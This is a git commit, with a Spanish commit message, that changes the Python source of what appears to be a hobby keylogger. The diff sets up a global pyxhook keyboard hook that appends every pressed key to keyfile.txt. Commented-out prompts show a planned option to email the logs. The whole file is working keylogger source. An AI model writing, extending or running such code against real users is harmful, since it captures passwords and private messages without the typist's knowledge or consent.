f0c5de2608430359fb3b1f0c9b6eb63fbc65e775
Siro <sirofatala@gmail.com>
2025-05-24 20:29:25 -0400

    Se guardan las teclas presionadas

--- src/main.py
+++ src/main.py
@@ -2,16 +2,22 @@ import pyxhook
 
 respuesta_afirmativa = ("yes", "y")
 
-def callback(event):
+def oneKeyEvent(event):
     with open("keyfile.txt", "a") as logKey: 
-        logKey.write(f"{event.Key}\n")
-    return True 
+        try: 
+            logKey.write(f"{event.Key}\n")
+            return True
+        except: 
+            return False 
+
+def callback():
+    hm = pyxhook.HookManager()
+    hm.KeyDown = oneKeyEvent
+    hm.HookKeyboard()
+    hm.start() 
      
 if __name__ == "__main__":
     # enviar = input("¿Deseas enviar los registros por email?[y/n]") in respuesta_afirmativa  
     # guardar = input("¿Deseas guardar los registros en texto plano?[y/n]") in respuesta_afirmativa
     
-    hm = pyxhook.HookManager()
-    hm.KeyDown = callback
-    hm.HookKeyboard()
-    hm.start()
+    callback()
